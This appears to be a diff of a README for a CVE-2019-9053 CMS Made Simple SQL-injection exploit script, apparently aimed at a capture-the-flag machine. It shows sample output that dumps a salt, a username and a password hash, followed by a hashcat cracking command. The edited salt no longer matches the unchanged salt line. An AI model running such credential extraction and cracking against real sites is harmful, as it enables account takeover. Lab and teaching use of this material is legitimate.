@@ -29,15 +29,15 @@ python3 cmsms-sqli.py url
 [+] CVE-2019-9053 CMS Made Simple SQLi (Python3)
 [+] Target: http://machine_ip/writeup/moduleinterface.php?mact=News,m1_,default,0
 [+] Dumping SALT...
-L7b8v5p3
+5a599ef579066807
 [+] Salt: L7b8v5p3
 [+] Dumping USERNAME...
 jkr
 [+] Username: jkr
 [+] Dumping PASSWORD MD5...
-5f4dcc3b5aa765d61d8327deb882cf99
-[+] MD5 Hash: 5f4dcc3b5aa765d61d8327deb882cf99
-[+] Crack: hashcat -m 0 '5f4dcc3b5aa765d61d8327deb882cf99' 'L7b8v5p3' rockyou.txt
+62def4866937f08cc13bab43bb14e6f7
+[+] MD5 Hash: 62def4866937f08cc13bab43bb14e6f7
+[+] Crack: hashcat -a 0 -m 20 '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' /usr/share/wordlists/rockyou.txt
 ```
 # 🔧 **Customization**:
 
